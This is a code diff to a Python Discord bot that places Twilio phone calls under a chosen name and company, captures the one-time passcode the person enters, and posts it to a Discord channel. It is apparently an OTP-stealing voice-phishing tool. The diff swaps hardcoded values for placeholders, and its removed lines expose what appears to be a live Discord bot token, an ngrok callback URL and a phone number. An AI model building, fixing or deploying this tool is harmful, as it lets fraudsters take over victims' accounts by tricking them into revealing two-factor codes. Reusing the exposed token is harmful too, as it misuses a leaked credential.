@@ -9,11 +9,12 @@ import time
 client_discord = commands.Bot(command_prefix='=')
 slash = SlashCommand(client_discord, sync_commands=True)
 guild = discord.Guild
-account_sid = your_acc_sid
-auth_token = your_auth_token
-your_twilio_phone_number = your_twilio_phone_number
-ngrok = your_ngrok_url
+account_sid = 'your account sid'
+auth_token = 'your auth token'
+your_twilio_phone_number = 'your twilio phone number'
+ngrok = 'your ngrok url'
 client = Client(account_sid, auth_token)
+server_id = 12345678990
 
 app = Flask(__name__)
 
@@ -22,7 +23,7 @@ app = Flask(__name__)
 @slash.slash(
     name='call',
     description='F',
-    guild_ids=[932525902380814386],
+    guild_ids=[server_id],
     options=[
         discord_slash.utils.manage_commands.create_option(
             name='phone',
@@ -64,7 +65,7 @@ async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=s
     open('Extra/Name.txt', 'w').write(f'{name}')
     open('Extra/Company Name.txt', 'w').write(f'{companyname}')
     call = client.calls.create(
-        url=f{ngrok}'/voice',
+        url=f'{ngrok}/voice',
         to=f'{phone}',
         from_=f'{your_twilio_phone_number}'
     )
@@ -135,7 +136,7 @@ async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=s
 @slash.slash(
     name='callagain',
     description='For wrong otp code',
-    guild_ids=[932525902380814386],
+    guild_ids=[server_id],
     options=[
         discord_slash.utils.manage_commands.create_option(
             name='phone',
@@ -176,7 +177,7 @@ async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=s
     open('Extra/Name.txt', 'w').write(f'{name}')
     open('Extra/Company Name.txt', 'w').write(f'{companyname}')
     call = client.calls.create(
-        url='https://1634-180-75-237-245.ngrok.io/voiceagain',
+        url=f'{ngrok}/voiceagain',
         to=f'{phone}',
         from_='+13344633251'
     )
@@ -239,9 +240,10 @@ async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=s
                               description=f'{otp}\n\n\n\nPrice : {call1.price}\nDuration : {call1.duration} secs',
                               color=discord.Colour.green())
         await ctx.channel.send(embed=embed)
-    open('otp.txt', 'w').write('')
-    open('status.txt', 'w').write('')
+    open('otp.txt', 'w').close()
+    open('status.txt', 'w').close()
 
 client_discord.run(
-    'OTMyNTI1NTM1MjExNDQyMjA2.YeUQFQ.QJ4G4ALYiQGD4s-mxFLcIOihiGc'
+    'discord_token'
 )
+
